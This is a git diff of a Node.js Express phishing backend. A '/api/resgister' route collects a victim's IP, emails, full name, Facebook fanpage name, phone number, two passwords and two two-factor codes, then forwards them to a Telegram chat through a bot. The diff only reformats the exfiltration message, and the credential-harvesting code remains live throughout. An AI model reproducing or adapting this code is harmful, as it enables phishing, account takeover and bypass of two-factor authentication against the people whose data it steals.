@@ -26,20 +26,9 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
     
-    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
------------------------------
-<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
-<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
-<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
-<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
-<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
-<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
------------------------------
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
+    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}\n-----------------------------\n<strong>Email Business:</strong> <code>${data.businessEmail ? data.businessEmail : ''} </code>\n<strong>Email Personal:</strong> <code>${data.personalEmail ? data.personalEmail : ''}</code>\n<strong>Full Name:</strong> <code>${data.fullName ? data.fullName : ''} </code>\n<strong>Fanpage Name:</strong> <code>${data.fanpageName ? data.fanpageName : ''}</code>\n<strong>Phone Number:</strong> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>\n<strong>Password First:</strong> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>\n<strong>Password Second:</strong> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>\n-----------------------------\n<strong>First Two-Fa:</strong> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>\n<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>\n`;
 
-    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
+    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
 
 
 
